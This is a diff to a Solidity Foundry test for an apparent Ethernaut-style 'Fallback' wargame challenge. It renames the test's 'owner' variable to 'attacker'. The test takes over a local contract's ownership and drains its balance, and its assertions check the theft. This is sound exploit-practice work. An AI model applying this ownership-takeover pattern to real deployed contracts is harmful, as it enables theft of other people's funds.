@@ -7,13 +7,13 @@ import {Fallback} from "../src/Fallback.sol";
 
 contract FallbackAttackTest is Test{
   Fallback fallbackContract;
-  address owner;
+  address attacker;
   uint256 INITIAL_BALANCE = 1e18;
   
   function setUp() public {
     fallbackContract = new Fallback();
-    owner = vm.addr(3);
-    vm.deal(address(owner), INITIAL_BALANCE);
+    attacker = vm.addr(3);
+    vm.deal(address(attacker), INITIAL_BALANCE);
   }
 
   function testShouldStealContractBalance() public{
@@ -31,7 +31,7 @@ contract FallbackAttackTest is Test{
     assertEq(address(fallbackContract).balance, 200);
 
     // attack
-    vm.startPrank(owner);
+    vm.startPrank(attacker);
 
     // Contributing
     fallbackContract.contribute{value: 1}();
@@ -45,9 +45,9 @@ contract FallbackAttackTest is Test{
 
     vm.stopPrank();
 
-    assertEq(fallbackContract.contributions(owner), 1);
-    assertEq(fallbackContract.owner(), owner);
-    assertEq(address(owner).balance, INITIAL_BALANCE + 200);
+    assertEq(fallbackContract.contributions(attacker), 1);
+    assertEq(fallbackContract.owner(), attacker);
+    assertEq(address(attacker).balance, INITIAL_BALANCE + 200);
     assertEq(address(fallbackContract).balance, 0);
   }
 }
